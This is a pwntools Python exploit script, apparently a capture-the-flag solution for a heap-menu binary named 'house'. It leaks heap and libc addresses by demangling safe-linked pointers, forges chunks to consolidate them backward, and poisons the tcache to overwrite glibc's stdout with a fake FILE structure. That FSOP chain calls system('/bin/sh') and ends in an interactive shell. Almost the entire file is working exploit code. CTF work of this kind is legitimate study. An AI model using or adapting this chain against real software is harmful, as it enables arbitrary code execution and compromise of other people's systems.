#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./house')
libc = elf.libc
context.update(
    log_level='debug'
)

sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
s = lambda x: p.send(x)
rcall = lambda x: p.recvall(x)
rcud = lambda x: p.recvuntil(x, drop=True)
rcu = lambda x: p.recvuntil(x)
rcl = lambda: p.recvline(0)
rcn = lambda x: p.recv(x)
logi = lambda x, y: log.info(f'{x} = {hex(y)}')
def bleak(x): ret = unpack(x, 'all'); logi('leak', ret); return ret
def hleak(x): ret = eval(x); logi('leak', ret); return ret

def start():
    global libc
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug([elf.path], c)
    else:
        return elf.process()

c = '''
c
'''

REMOTE = 'nc localhost 5000'.replace('nc ', '').split(' ')
HOST = REMOTE[0] if REMOTE else ''
PORT = int(REMOTE[1]) if len(REMOTE) > 1 else 0

def add(idx, size, payload):
    sla(b'(_)> ', b'2')
    sla(b'(2)> ', f'{idx}'.encode())
    sla(b'? \n', f'{size}'.encode())
    sl(payload)

def read(idx):
    sla(b'(_)> ', b'1')
    sla(b'(1)> ', f'{idx}'.encode())

def delete(idx):
    sla(b'(_)> ', b'3')
    sla(b'(3)> ', f'{idx}'.encode())

def mangle(leak:int, target:int) -> int:
    return leak >> 12 ^ target

def demangle(addr:int) -> int:
    mid = addr >> 12 ^ addr
    ril = mid >> 24 ^ mid
    return ril

p = start()

add(1, 10, b'A')
add(2, 10, b'B')
delete(2)
delete(1)
add(1, 10, b'')
add(2, 10, b'')

read(1)
heap = (demangle(bleak(rcn(6))) & 0xffffffffff00) + 0xa0
logi('demangle', heap)

fake = flat(
    0,
    0x120,
    heap+0x40,
    heap+0x40
)
add(0, 0x38, fake)
add(1, 0xe8, b'overflow here')
add(2, 0xf8, b'will be overflown')
delete(1)
add(1, 0xe8, b'\x00'*0xe0 + p64(0x120) + b'\x00')

for i in range(7):
    add(14 - i, 0xf8, b'fill in tcache')
for i in range(7):
    delete(14 - i)

delete(2)
add(3, 0x218, b'')
add(4, 0xe8, b'padding')
delete(4)
delete(1)

add(14, 0x500, b'libc leak')
add(13, 10, b'pad')
delete(14)
add(14, 0x500, b'')
read(14)
libc.address = bleak(rcn(6)) - 0x1fed0a
logi('libc', libc.address)

stdout = libc.sym["_IO_2_1_stdout_"]
stdout_lock = libc.address + 0x2008f0
vtable = libc.sym["_IO_wfile_jumps"] - 0x18

# fsop technique from https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/exp_fsop.py
stdout_lock = libc.address + 0x2008f0	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = libc.address + 0x0016e267 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']		# the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200		# _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
poison = flat(
    0,
    0,
    0,
    0,
    0,
    0xd1,
    mangle(heap, libc.sym['_IO_2_1_stdout_'])
)
delete(3)
add(3, 0x218, poison)
add(0, 0xe8, b'win')
add(1, 0xe8, bytes(fake))

p.interactive()